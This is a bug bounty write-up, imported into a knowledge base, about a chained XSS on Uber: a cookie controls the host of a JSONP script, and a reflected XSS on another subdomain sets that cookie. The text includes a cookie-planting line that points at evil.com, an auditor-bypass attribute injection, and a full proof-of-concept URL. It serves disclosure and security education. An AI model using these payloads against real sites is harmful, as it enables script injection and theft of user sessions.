---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-08-30_uber-xss-via-cookie.md
original_filename: 2017-08-30_uber-xss-via-cookie.md
title: Uber XSS via Cookie
category: documents
detected_topics:
- xss
- command-injection
- api-security
tags:
- imported
- documents
- xss
- command-injection
- api-security
language: en
raw_sha256: 8854606855a06262101a26e82df0b458c1a7ba884e8bdc17801c32634d2d8da3
text_sha256: 0442977b4eb0350096319a06a71b8e591c81ffee9a4d07bc7012e78a48d5e229
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Uber XSS via Cookie

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-08-30_uber-xss-via-cookie.md
- Source Type: markdown
- Detected Topics: xss, command-injection, api-security
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `8854606855a06262101a26e82df0b458c1a7ba884e8bdc17801c32634d2d8da3`
- Text SHA256: `0442977b4eb0350096319a06a71b8e591c81ffee9a4d07bc7012e78a48d5e229`


## Content

---
title: "Uber XSS via Cookie"
page_title: "[BBP系列二] Uber XSS via Cookie | zhchbin"
url: "http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/"
final_url: "http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/"
authors: ["Chaobin Zhang"]
programs: ["Uber"]
bugs: ["XSS"]
bounty: "5,000"
publication_date: "2017-08-30"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6115
---

#  [BBP系列二] Uber XSS via Cookie 

__ Posted on 2017-08-30 __ Edited on 2022-05-15

This write up is about part of my latest XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly.

## JSONP Request

Several months ago, when enjoying my Spring Festival Holiday at home, I decided to do something interesting, so I started hunting for a bug. I like searching in the chrome dev tools. This time my lucky word was `jsonp`, and my target domain was `https://get.uber.com`. Let’s look at what I had found at that time.
  
  
  1  
  2  
  3  
  4  
  5  
  6  
  7  
  8  
  

| 
  
  
  idrCall: function() {  
  var a, b;  
  return this.idrCallPending ? void 0 : (this.log("making idr call"),  
  a = this.rfiServer ? this.rfiServer : "a.rfihub.com",  
  b = this.getProtocol() + "//" + a + "/idr.js",  
  this.jsonpGet(b, {}, this.idrCallback, "cmZpSWRJbkNhY2hl"),  
  this.idrCallPending = !0)  
  },  
  
  
---|---  
  
![](/images/7184df6bgy1fj2030d1ocj21d00r0gsw.jpg)

Nothing suspicious? Not! When came cross these lines of code, I was thinking about whether the value of `this.rfiServer` could be controlled by me. If yes, we can force the browser to load arbitrary javascript file. To understand this, you should know [the essence of JSONP](https://stackoverflow.com/a/2067584). The next step was searching everything about `rfiServer`.

![](/images/7184df6bgy1fj20krdxhbj20tm0f042c.jpg)

After reading through these lines of code:
  
  
  1  
  2  
  

| 
  
  
  a = this.readCookie("_rfiServer"),  
  null != a && this.setRfiServer(a),  
  
  
---|---  
  
We could get the information that the initial value of `this.rfiServer` was set by using value of cookie `_rfiServer` if exists. Now the problem became how we can set cookie of Uber sites? But how? Here was the options in my mind at that time:

  * HTTP Header CRLF Injection at any subdomain of uber.com
  * XSS at any subdomain of uber.com

What? We need to find a bug to trigger another bug. And why any subdomain of uber.com?

## The Feature of Cookie

Any subdomain of uber.com can set cookie with domain `.uber.com` to be used across subdomains. For instance, we can set cookie in `xxx.uber.com` using following code, then `get.uber.com` will use the cookie value.
  
  
  1  
  

| 
  
  
  document.cookie = '_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/'  
  
  
---|---  
  
## XSS of .uber.com which is Out of Scope

I did really find out one reflected XSS in one of Uber’s subdomain using search engine. Let’s call the domain `<redacted>.uber.com` for demo.

![](/images/7184df6bgy1fj21w61lp8j21dw0fy79z.jpg)

  1. `"` is reflected and not encoded. We can inject any attribution into `input` tag.
  2. `type="text"` is after the injection point. So we can inject `type="image" src="1" onerror="alert(1)"`. Note that when there is two types, the second one will be ignored.
  3. `>` is removed!!! This can be used to bypass Chrome XSS Auditor. How? `o>nerror`.

## Summary

  1. Use reflected XSS of `<redacted>.uber.com` to set the value of `_rfiServer` cookie to `evil.com`
  2. Visit `get.uber.com`, JSONP request to `https://evil.com/idr.js`, XSS of `get.uber.com` is done.
  3. The final PoC
  
  1  
  2  
  3  
  

| 
  
  https://<redacted>.uber.com/<redacted>?  
  email=aaa"%20type%3d"image"%20src%3d1%20o>nerror%3d"eval(decodeURIComponent(location.hash.substr(1)))  
  #document.cookie='_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/';location.href="https://get.uber.com";  
  
  
---|---  
  4. Thanks for Uber. Reward: 5k

[# 安全](/tags/安全/) [# XSS](/tags/XSS/) [# BBP](/tags/BBP/)

[ __分享插件AddThis导致的DOM XSS](/2016/12/25/DOM-XSS-Caused-by-AddThis/ "分享插件AddThis导致的DOM XSS")

[ [BBP系列三] Hijack the JS File of Uber's Website __](/2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/ "\[BBP系列三\] Hijack the JS File of Uber's Website")
